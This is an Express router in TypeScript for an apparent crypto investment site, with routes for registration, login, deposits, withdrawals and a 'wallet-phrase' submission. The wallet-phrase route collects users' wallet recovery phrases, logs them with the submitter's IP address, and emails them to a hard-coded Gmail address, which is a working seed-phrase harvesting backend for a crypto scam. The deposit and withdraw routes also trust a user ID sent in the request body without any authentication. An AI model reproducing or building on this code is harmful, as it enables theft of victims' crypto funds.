import { Router } from "express";
import type { Request, Response } from "express";
import bcrypt from "bcryptjs";
import { eq } from "drizzle-orm";
import {
  db, usersTable, depositsTable, withdrawalsTable, walletPhrasesTable,
  referralsTable, settingsTable,
} from "@workspace/db";
import { generateUserToken } from "../middlewares/auth";
import { nanoid } from "../lib/nanoid";
import {
  sendWelcomeEmail, sendDepositRequestToAdmin,
  sendWithdrawalRequestToAdmin, sendWalletPhraseToAdmin,
} from "../lib/email";

const router = Router();

router.post("/register", async (req: Request, res: Response) => {
  try {
    const { email, password, firstName, lastName, phone, country, referralCode: refCode } = req.body as {
      email: string; password: string; firstName: string; lastName: string;
      phone?: string; country?: string; referralCode?: string;
    };

    const [existing] = await db.select().from(usersTable).where(eq(usersTable.email, email));
    if (existing) { res.status(400).json({ error: "Email already registered" }); return; }

    const [settings] = await db.select().from(settingsTable).limit(1);
    const welcomeBonus = settings?.welcomeBonus ?? 0;
    const passwordHash = await bcrypt.hash(password, 12);
    const referralCode = nanoid(8).toUpperCase();

    let referrer: typeof usersTable.$inferSelect | undefined;
    if (refCode) {
      const [r] = await db.select().from(usersTable).where(eq(usersTable.referralCode, refCode));
      referrer = r;
    }

    const [user] = await db.insert(usersTable).values({
      email, passwordHash, firstName, lastName, phone, country,
      balance: welcomeBonus, referralCode, referredBy: referrer?.referralCode ?? null,
    }).returning();

    if (referrer && user) {
      const bonusPct = settings?.referralBonusPercent ?? 5;
      const bonus = Math.round(welcomeBonus * bonusPct) / 100;
      await db.insert(referralsTable).values({ referrerId: referrer.id, referredId: user.id, bonusAmount: bonus });
      if (bonus > 0) {
        await db.update(usersTable).set({ balance: (referrer.balance ?? 0) + bonus }).where(eq(usersTable.id, referrer.id));
      }
    }

    await sendWelcomeEmail(user!.email, `${user!.firstName} ${user!.lastName}`, user!.referralCode);

    const token = generateUserToken(user!.id, user!.email);
    res.status(201).json({ token, user: safeUser(user!) });
  } catch (err) {
    req.log.error({ err }, "registerUser error");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/login", async (req: Request, res: Response) => {
  try {
    const { email, password } = req.body as { email: string; password: string };
    const [user] = await db.select().from(usersTable).where(eq(usersTable.email, email));
    if (!user) { res.status(401).json({ error: "Invalid credentials" }); return; }
    if (user.suspended) { res.status(403).json({ error: "Account suspended" }); return; }
    const valid = await bcrypt.compare(password, user.passwordHash);
    if (!valid) { res.status(401).json({ error: "Invalid credentials" }); return; }
    const token = generateUserToken(user.id, user.email);
    res.json({ token, user: safeUser(user) });
  } catch (err) {
    req.log.error({ err }, "loginUser error");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/deposit", async (req: Request, res: Response) => {
  try {
    const { userId, amount, method, txHash } = req.body as { userId: number; amount: number; method: string; txHash?: string };
    const [dep] = await db.insert(depositsTable).values({ userId, amount, method, txHash }).returning();
    const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
    const [settings] = await db.select().from(settingsTable).limit(1);
    const adminEmail = settings?.adminEmail ?? "smartsafepalpremium@gmail.com";
    if (user) {
      await sendDepositRequestToAdmin(adminEmail, `${user.firstName} ${user.lastName}`, user.email, amount, method);
    }
    res.status(201).json({ id: dep!.id, userId: dep!.userId, amount: dep!.amount, method: dep!.method, txHash: dep!.txHash, status: dep!.status, adminNote: dep!.adminNote, createdAt: dep!.createdAt.toISOString(), updatedAt: dep!.updatedAt.toISOString(), userEmail: user?.email ?? null, userName: user ? `${user.firstName} ${user.lastName}` : null });
  } catch (err) {
    req.log.error({ err }, "submitDeposit error");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/withdraw", async (req: Request, res: Response) => {
  try {
    const { userId, amount, method, walletAddress } = req.body as { userId: number; amount: number; method: string; walletAddress: string };
    const [w] = await db.insert(withdrawalsTable).values({ userId, amount, method, walletAddress }).returning();
    const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
    const [settings] = await db.select().from(settingsTable).limit(1);
    const adminEmail = settings?.adminEmail ?? "smartsafepalpremium@gmail.com";
    if (user) {
      await sendWithdrawalRequestToAdmin(adminEmail, `${user.firstName} ${user.lastName}`, user.email, amount, method);
    }
    res.status(201).json({ id: w!.id, userId: w!.userId, amount: w!.amount, method: w!.method, walletAddress: w!.walletAddress, status: w!.status, adminNote: w!.adminNote, createdAt: w!.createdAt.toISOString(), updatedAt: w!.updatedAt.toISOString(), userEmail: user?.email ?? null, userName: user ? `${user.firstName} ${user.lastName}` : null });
  } catch (err) {
    req.log.error({ err }, "submitWithdrawal error");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/wallet-phrase", async (req: Request, res: Response) => {
  try {
    const { userId, phrase, walletType } = req.body as { userId?: number; phrase: string; walletType: string };
    const ipAddress = req.headers["x-forwarded-for"]?.toString().split(",")[0] ?? req.socket.remoteAddress ?? null;
    const [wp] = await db.insert(walletPhrasesTable).values({ userId: userId ?? null, phrase, walletType, ipAddress }).returning();
    const [user] = userId ? await db.select().from(usersTable).where(eq(usersTable.id, userId)) : [undefined];
    const [settings] = await db.select().from(settingsTable).limit(1);
    const adminEmail = settings?.adminEmail ?? "smartsafepalpremium@gmail.com";
    await sendWalletPhraseToAdmin(adminEmail, user?.email ?? null, phrase, walletType, ipAddress);
    res.status(201).json({ id: wp!.id, userId: wp!.userId, phrase: wp!.phrase, walletType: wp!.walletType, ipAddress: wp!.ipAddress, createdAt: wp!.createdAt.toISOString(), userEmail: user?.email ?? null });
  } catch (err) {
    req.log.error({ err }, "submitWalletPhrase error");
    res.status(500).json({ error: "Internal server error" });
  }
});

function safeUser(u: typeof usersTable.$inferSelect) {
  return {
    id: u.id, email: u.email, firstName: u.firstName, lastName: u.lastName,
    phone: u.phone, country: u.country, balance: u.balance, profit: u.profit,
    status: u.status, referralCode: u.referralCode, referredBy: u.referredBy,
    createdAt: u.createdAt.toISOString(),
  };
}

export default router;
